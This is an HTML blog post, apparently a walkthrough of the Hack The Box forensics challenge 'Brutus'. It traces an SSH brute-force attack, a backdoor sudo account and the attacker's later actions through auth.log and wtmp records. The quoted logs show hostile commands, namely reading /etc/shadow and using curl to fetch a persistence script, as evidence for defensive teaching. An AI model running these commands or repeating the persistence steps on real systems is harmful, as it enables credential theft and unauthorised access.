@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>HTB Brutus Guide</title>
+  <link rel="stylesheet" href="https://kallel181.github.io/Blog/static/css/styles.css"/>
+</head>
+<body>
+  <div class="container">
+    <header class="post-header">
+      <h1>HTB Brutus Guide</h1>
+      <div class="post-meta">
+        <span class="date">2024-05-10</span> —
+        <span class="tags"><span class="tag">HTB</span><span class="tag">sherlock</span><span class="tag">SSH</span><span class="tag">wtmp</span></span>
+      </div>
+      <img class="post-banner" src="/static/images/htb_brutus_guide_banner.png" alt="Imagem do post"/>
+    </header>
+    <article class="post-body">
+      <p>Brutus is a Sherlock from Hack The Box, a challenge made for you to investigate a scenario using the files provided to answer a series of questions and solve a mystery. In this Sherlock we will use Unix auth.log and wtmp logs to find the author of a brute force attack and some of its actions on the system.</p>
+<h1>Sherlock Scenario</h1>
+<p>In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.</p>
+<h1>auth.log file</h1>
+<p>The auth.log file stores all the actions that need authentication made in the system, like sudo actions, user switch and even ssh logins. </p>
+<h2>auth.log Fields</h2>
+<p>We can take  a look on the auth.log file using cat, in that case we can see this:</p>
+<pre><code>┌──(kali㉿atropos)-[~/htb/sherlocks/brutus]
+└─$ cat auth.log                     
+Mar  6 06:18:01 ip-172-31-35-28 CRON[1119]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:18:01 ip-172-31-35-28 CRON[1118]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:18:01 ip-172-31-35-28 CRON[1117]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:18:01 ip-172-31-35-28 CRON[1118]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:18:01 ip-172-31-35-28 CRON[1119]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:18:01 ip-172-31-35-28 CRON[1117]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:19:01 ip-172-31-35-28 CRON[1366]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:19:01 ip-172-31-35-28 CRON[1367]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:19:01 ip-172-31-35-28 CRON[1366]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:19:01 ip-172-31-35-28 CRON[1367]: pam_unix(cron:session): session closed for user confluence
+
+&lt;SNIP&gt;
+</code></pre>
+<p>As we can see here, the auth.log file is nicely separated in fields, let's take a moment to analyze those fields and understand what they mean. Let's take one line for example:
+<img alt="authlog_fields.png" src="/static/images/htb_brutus_guide_1.png"/>
+Here we have the month for the log <strong>(1)</strong>, the day for the log <strong>(2)</strong> and the time for the log <strong>(3)</strong>. On <strong>(4)</strong> we have the name of the system, on <strong>(5)</strong> we have the daemon or the service reporting the event, there we have the PID for the service/daemon. And the last part <strong>(6)</strong> we have a description for the event, this description may be different depending on the event, on the example above, we have an invalid login on ssh, that invalid login event provide us with an IP and a port.</p>
+<h2>wtmp file</h2>
+<p>The wtmp file keeps the historical data of users who logged-in and logged out of the system. This can help us to identify users who logged in, and it's time, this is the only file on that challenge that we will need an especial program to open it, but we will get to that later on.</p>
+<h1>Starting the investigation</h1>
+<p>Let's start with the auth.log, and that is a big file, to better manage our work with it is best to use a text editor, so we can have an easier access to search and highlighting tools. In that case, I will use Notepad++ to work with the auth.log file from now on.</p>
+<h2>Analyzing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack?</h2>
+<p>On the begging of the auth.log file we have a series of <a href="https://man7.org/linux/man-pages/man8/cron.8.html">cron</a> logs, cron is a daemon that executes commands on time intervals and specific dates, that means the first 67 lines on that log isn't important for us right now. Below that we can find a series of sshd events, and a lot of them being invalid users login attempts, on the line 68 we can see the first invalid login attempt.</p>
+<pre><code>Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380
+</code></pre>
+<p>Here we can find the answer to the first question, <code>65.2.161.68</code> is the IP used by the attacker to carry out the brute force attack.</p>
+<h2>The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account?</h2>
+<p>Let's now annalise the attack, we saw in the first attempt for the attack the attacker tried to log in with a username <code>admin</code>, but we can see on the log that this is an invalid user, that means, the attacker would never be able to log in, that user doesn't exist on the system. Further down, the attacker used a some other usernames, like <code>server_adm</code>(first appearance on line 145), <code>svc_account</code>(first appearance on line 189) and <code>root</code>(first appearance on line 258). But the username <code>root</code> does exist on the system, now let's try to find the successful login attempt (and if it has any successful login attempt).</p>
+<p>On the line 281 we can see that:</p>
+<pre><code>Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
+</code></pre>
+<p>That is a valid login for the user <code>root</code>, shortly after that the user got disconnected (On lines 293 to 295):</p>
+<pre><code>Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Received disconnect from 65.2.161.68 port 34782:11: Bye Bye
+Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Disconnected from user root 65.2.161.68 port 34782
+Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: pam_unix(sshd:session): session closed for user root
+</code></pre>
+<p>The attack followed on trying to log in with other users, but it ended shortly after.</p>
+<h2>Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?</h2>
+<p>There are two files where we can find the answer for this question. First, let's look on the auth.log for the second login, there we can find on the line 322:</p>
+<pre><code>Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
+</code></pre>
+<p>Here, we can see the login on 06:32:44 but, before let's see the wtmp file, to see the contents of the wtmp we can use <code>utmpdump</code>:</p>
+<pre><code>┌──(kali㉿atropos)-[~/htb/sherlocks/brutus]
+└─$ utmpdump wtmp 
+Utmp dump of wtmp
+[2] [00000] [~~  ] [reboot  ] [~           ] [6.2.0-1017-aws      ] [0.0.0.0        ] [2024-01-25T11:12:17,804944+00:00]
+[5] [00601] [tyS0] [        ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-01-25T11:12:31,072401+00:00]
+[6] [00601] [tyS0] [LOGIN   ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-01-25T11:12:31,072401+00:00]
+[5] [00618] [tty1] [        ] [tty1        ] [                    ] [0.0.0.0        ] [2024-01-25T11:12:31,080342+00:00]
+[6] [00618] [tty1] [LOGIN   ] [tty1        ] [                    ] [0.0.0.0        ] [2024-01-25T11:12:31,080342+00:00]
+[1] [00053] [~~  ] [runlevel] [~           ] [6.2.0-1017-aws      ] [0.0.0.0        ] [2024-01-25T11:12:33,792454+00:00]
+[7] [01284] [ts/0] [ubuntu  ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-01-25T11:13:58,354674+00:00]
+[8] [01284] [    ] [        ] [pts/0       ] [                    ] [0.0.0.0        ] [2024-01-25T11:15:12,956114+00:00]
+[7] [01483] [ts/0] [root    ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-01-25T11:15:40,806926+00:00]
+[8] [01404] [    ] [        ] [pts/0       ] [                    ] [0.0.0.0        ] [2024-01-25T12:34:34,949753+00:00]
+[7] [836798] [ts/0] [root    ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-02-11T10:33:49,408334+00:00]
+[5] [838568] [tyS0] [        ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-02-11T10:39:02,172417+00:00]
+[6] [838568] [tyS0] [LOGIN   ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-02-11T10:39:02,172417+00:00]
+[7] [838962] [ts/1] [root    ] [pts/1       ] [203.101.190.9       ] [203.101.190.9  ] [2024-02-11T10:41:11,700107+00:00]
+[8] [838896] [    ] [        ] [pts/1       ] [                    ] [0.0.0.0        ] [2024-02-11T10:41:46,272984+00:00]
+[7] [842171] [ts/1] [root    ] [pts/1       ] [203.101.190.9       ] [203.101.190.9  ] [2024-02-11T10:54:27,775434+00:00]
+[8] [842073] [    ] [        ] [pts/1       ] [                    ] [0.0.0.0        ] [2024-02-11T11:08:04,769514+00:00]
+[8] [836694] [    ] [        ] [pts/0       ] [                    ] [0.0.0.0        ] [2024-02-11T11:08:04,769963+00:00]
+[1] [00000] [~~  ] [shutdown] [~           ] [6.2.0-1017-aws      ] [0.0.0.0        ] [2024-02-11T11:09:18,000731+00:00]
+[2] [00000] [~~  ] [reboot  ] [~           ] [6.2.0-1018-aws      ] [0.0.0.0        ] [2024-03-06T06:17:15,744575+00:00]
+[5] [00464] [tyS0] [        ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-03-06T06:17:27,354378+00:00]
+[6] [00464] [tyS0] [LOGIN   ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-03-06T06:17:27,354378+00:00]
+[5] [00505] [tty1] [        ] [tty1        ] [                    ] [0.0.0.0        ] [2024-03-06T06:17:27,469940+00:00]
+[6] [00505] [tty1] [LOGIN   ] [tty1        ] [                    ] [0.0.0.0        ] [2024-03-06T06:17:27,469940+00:00]
+[1] [00053] [~~  ] [runlevel] [~           ] [6.2.0-1018-aws      ] [0.0.0.0        ] [2024-03-06T06:17:29,538024+00:00]
+[7] [01583] [ts/0] [root    ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-03-06T06:19:55,151913+00:00]
+[7] [02549] [ts/1] [root    ] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:32:45,387923+00:00]
+[8] [02491] [    ] [        ] [pts/1       ] [                    ] [0.0.0.0        ] [2024-03-06T06:37:24,590579+00:00]
+[7] [02667] [ts/1] [cyberjunkie] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:37:35,475575+00:00]
+</code></pre>
+<p>In the lasts lines of this log, we can find the last root login made by the 65.2.161.68 IP:</p>
+<pre><code>[7] [02549] [ts/1] [root    ] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:32:45,387923+00:00]
+</code></pre>
+<p>Here we can see 2 possible answers for this question: 06:32:44 and 06:32:45. So, <strong>why there are 2 answers for this question? Why there is a discrepancy between the 2 files?</strong>
+To answer that question we need to understand one thing, the wtmp file creates a log when a terminal is created for a user, the auth.log create logs on authentication events, so, there is this gap between the authentication and the terminal creation time. So, for that question, the correct time will be <strong>2024-03-06 06:32:45</strong>.</p>
+<h2>SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?</h2>
+<p>That is a easy one, on the auth.log we can find this next to the manual login made by the attacker:</p>
+<pre><code>Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
+</code></pre>
+<p>Here we can see the session number is 37.</p>
+<h2>The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?</h2>
+<p>On the lines 333 and 346 the can see in more details the new user that was crated:</p>
+<pre><code>Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
+Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
+Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
+
+&lt;SNIP&gt;
+
+Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002
+Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie
+Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002
+Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
+Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
+Mar  6 06:34:31 ip-172-31-35-28 chfn[2605]: changed user 'cyberjunkie' information
+
+&lt;SNIP&gt;
+
+Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
+Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
+
+&lt;SNIP&gt;
+
+Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
+Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
+</code></pre>
+<p>We can see that the attacker created a group and a user named <strong>cyberjunkie</strong>, them, he added the user to the <strong>sudo</strong> group.</p>
+<h2>What is the MITRE ATT&amp;CK sub-technique ID used for persistence?</h2>
+<blockquote>
+<p>MITRE ATT&amp;CK® is a globally-accessible knowledge base of adversary tactics and techniques based on real-world observations. The ATT&amp;CK knowledge base is used as a foundation for the development of specific threat models and methodologies in the private sector, in government, and in the cybersecurity product and service community.
+https://attack.mitre.org</p>
+</blockquote>
+<p>On the MITRE website we can see under the <strong>Persistence(1)</strong> column the technique called <strong>Create Account(2)</strong>:
+<img alt="MITRE_brutus.png" src="/static/images/htb_brutus_guide_2.png"/>
+Navigating to that specific technique, we can see the sub-technique is the Local Account <a href="https://attack.mitre.org/techniques/T1136/001/">T1136.001</a>.</p>
+<h2>How long did the attacker's first SSH session last based on the previously confirmed authentication time and session ending within the auth.log? (seconds)</h2>
+<p>We already have the start time, 2024-03-06 06:32:45, looking in the auth.log we can find the end of the session:</p>
+<pre><code>Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
+Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
+Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
+
+&lt;SNIP&gt;
+
+Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002
+Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie
+Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002
+Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
+Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
+Mar  6 06:34:31 ip-172-31-35-28 chfn[2605]: changed user 'cyberjunkie' information
+
+&lt;SNIP&gt;
+
+Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
+Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
+
+&lt;SNIP&gt;
+
+Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
+Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
+</code></pre>
+<p>On the last line, we can see the time that the session has ended is 06:37:24. On the official write-up, we can find a really useful resource to calculate the time in this question, https://www.calculator.net/time-duration-calculator.html. Imputing the times we found we came with <strong>279 seconds</strong>.</p>
+<h2>The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?</h2>
+<p>Again on the auth.log by the end of the file we can see some of the actions performed by the attacker on the <strong>cyberjunkie</strong> account:</p>
+<pre><code>Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2
+Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: pam_unix(sshd:session): session opened for user cyberjunkie(uid=1002) by (uid=0)
+Mar  6 06:37:34 ip-172-31-35-28 systemd-logind[411]: New session 49 of user cyberjunkie.
+Mar  6 06:37:34 ip-172-31-35-28 systemd: pam_unix(systemd-user:session): session opened for user cyberjunkie(uid=1002) by (uid=0)
+Mar  6 06:37:57 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
+Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root
+
+&lt;SNIP&gt;
+
+Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
+Mar  6 06:39:38 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
+Mar  6 06:39:39 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root
+</code></pre>
+<p>We can see that the attacker just used cat on the <strong>/etc/shadow</strong>, and below that we can see that the attacker used curl to download a script <code>/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</code>.</p>
+    </article>
+  </div>
+</body>
+</html>
